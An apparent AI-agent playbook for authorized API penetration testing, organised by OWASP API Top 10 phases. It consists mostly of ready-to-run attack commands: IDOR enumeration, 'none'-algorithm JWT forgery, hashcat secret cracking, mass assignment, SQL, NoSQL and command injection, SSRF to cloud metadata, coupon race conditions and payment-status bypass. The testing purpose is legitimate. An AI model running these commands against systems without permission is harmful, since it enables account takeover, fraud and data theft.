# /api-security — API Security Assessment

```
Use agent: appsec-engineer
Coordinate with: appsec-lead, web-pentester
```

## Purpose

Conduct a comprehensive security assessment of REST, GraphQL, and gRPC APIs — covering authentication, authorization, input validation, rate limiting, business logic flaws, and OWASP API Security Top 10 (2023).

## Pre-Execution Check

- [ ] API documentation (OpenAPI/Swagger, GraphQL schema, Postman collection)
- [ ] Test environment or authorized production testing window
- [ ] Test user accounts with different privilege levels provisioned
- [ ] API base URL and authentication tokens obtained

## Testing Framework

### Phase 1: API Discovery & Documentation

```bash
API_BASE="https://api.target.com/v1"
AUTH_TOKEN="Bearer eyJ..."

# Download OpenAPI specification
curl -s "$API_BASE/openapi.json" > api-docs/openapi.json
curl -s "$API_BASE/swagger.json" > api-docs/swagger.json

# GraphQL introspection
curl -s -X POST "$API_BASE/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
  > api-docs/graphql-schema.json

# Auto-generate requests from OpenAPI spec
swagger-codegen generate -i openapi.json -l postman \
  -o api-docs/postman-collection/

# Discover undocumented endpoints
ffuf -w /opt/wordlists/api-endpoints.txt \
     -u "${API_BASE}/FUZZ" \
     -H "Authorization: $AUTH_TOKEN" \
     -mc 200,201,204,400,401,403,405 \
     -o recon/undocumented-endpoints.json
```

### Phase 2: Authentication & Authorization Testing (OWASP API1-API5)

```bash
# API1 — Broken Object Level Authorization (BOLA/IDOR)
# Test: Access other user's resources by changing ID
USER_A_TOKEN="Bearer TOKEN_A"
USER_B_ID="user-456"

# Can User A access User B's data?
curl -s -X GET "$API_BASE/users/$USER_B_ID/profile" \
  -H "Authorization: $USER_A_TOKEN"

# Can User A access User B's orders?
for id in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: $USER_A_TOKEN" "$API_BASE/orders/$id")
  [ "$code" = "200" ] && echo "POSSIBLE IDOR: /orders/$id returned 200"
done

# API2 — Broken Authentication
# Test: JWT vulnerabilities
# 1. Algorithm confusion (RS256 → HS256)
# 2. None algorithm
python3 - << 'EOF'
import jwt, base64
# Test none algorithm
token = jwt.encode({"user": "admin", "role": "admin"}, "", algorithm="none")
print("None alg token:", token)
EOF

# Test weak JWT secrets
hashcat -m 16500 captured-jwt.txt /opt/wordlists/rockyou.txt

# API3 — Broken Object Property Level Authorization
# Test: Mass assignment — send extra fields
curl -X PUT "$API_BASE/users/me" \
  -H "Authorization: $USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"updated", "role":"admin", "credits":99999}'

# API4 — Unrestricted Resource Consumption (Rate Limiting)
# Test: Send many requests rapidly
for i in $(seq 1 100); do
  curl -s -o /dev/null "$API_BASE/auth/login" \
    -d '{"username":"admin","password":"test"}'
done
# Check: Was account locked? Was rate-limit applied?

# API5 — Broken Function Level Authorization
# Test: Access admin endpoints with regular user token
ADMIN_ENDPOINTS=("/admin/users" "/admin/config" "/internal/metrics" "/debug/routes")
for ep in "${ADMIN_ENDPOINTS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: $USER_A_TOKEN" "$API_BASE$ep")
  echo "$code → $ep"
done
```

### Phase 3: Injection Testing (OWASP API8)

```bash
# SQL Injection in API parameters
sqlmap -u "$API_BASE/products?category=electronics" \
  -H "Authorization: $AUTH_TOKEN" \
  --batch --level=3

# NoSQL Injection (MongoDB)
curl -X POST "$API_BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne": null}, "password":{"$ne": null}}'

# Command Injection in API body
curl -X POST "$API_BASE/tools/ping" \
  -H "Authorization: $AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; id"}'

# Server-Side Request Forgery (SSRF)
curl -X POST "$API_BASE/integrations/webhook" \
  -H "Authorization: $AUTH_TOKEN" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# GraphQL — Injection
curl -X POST "$API_BASE/graphql" \
  -d '{"query":"{ user(id:\"1 OR 1=1\") { name email } }"}'

# GraphQL — Introspection (should be disabled in production)
curl -X POST "$API_BASE/graphql" \
  -d '{"query":"{ __schema { queryType { name } } }"}'
```

### Phase 4: Business Logic Testing

```bash
# Negative price / quantity manipulation
curl -X POST "$API_BASE/orders" \
  -H "Authorization: $AUTH_TOKEN" \
  -d '{"product_id": 123, "quantity": -1, "price": -50.00}'

# Race condition — double spending
for i in 1 2; do
  curl -X POST "$API_BASE/payment/redeem-coupon" \
    -H "Authorization: $AUTH_TOKEN" \
    -d '{"coupon": "DISCOUNT50"}' &
done
wait

# Workflow bypass — skip payment step
curl -X PUT "$API_BASE/orders/999/status" \
  -H "Authorization: $AUTH_TOKEN" \
  -d '{"status": "paid"}'

# Parameter pollution
curl "$API_BASE/transfer?from=myaccount&to=attacker&from=victimaccount"
```

### Phase 5: API-Specific Security Headers

```bash
# Check security headers
curl -sI "$API_BASE/users/me" -H "Authorization: $AUTH_TOKEN" | \
  grep -iE "x-content-type|strict-transport|x-frame|cors|content-security"

# CORS misconfiguration
curl -sI "$API_BASE/users/me" \
  -H "Origin: https://evil.com" \
  -H "Authorization: $AUTH_TOKEN" | grep -i "access-control"

# Check if API returns verbose errors
curl -X POST "$API_BASE/users" \
  -H "Content-Type: application/json" \
  -d '{"invalid": "payload"}'
# Should NOT reveal: stack traces, SQL errors, internal paths
```

## OWASP API Security Top 10 (2023) Checklist

| # | Category | Test Status |
|---|----------|-------------|
| API1 | Broken Object Level Authorization | [ ] |
| API2 | Broken Authentication | [ ] |
| API3 | Broken Object Property Level Authorization | [ ] |
| API4 | Unrestricted Resource Consumption | [ ] |
| API5 | Broken Function Level Authorization | [ ] |
| API6 | Unrestricted Access to Sensitive Business Flows | [ ] |
| API7 | Server-Side Request Forgery | [ ] |
| API8 | Security Misconfiguration | [ ] |
| API9 | Improper Inventory Management | [ ] |
| API10 | Unsafe Consumption of APIs | [ ] |

## Output

```
engagements/[id]/api-security/
├── api-inventory.md            ← All discovered endpoints
├── findings/
│   ├── CRITICAL-bola-orders.md
│   └── HIGH-rate-limiting-missing.md
└── api-security-summary.md
```

Handoff to `report-writer` → `/pentest-report`.
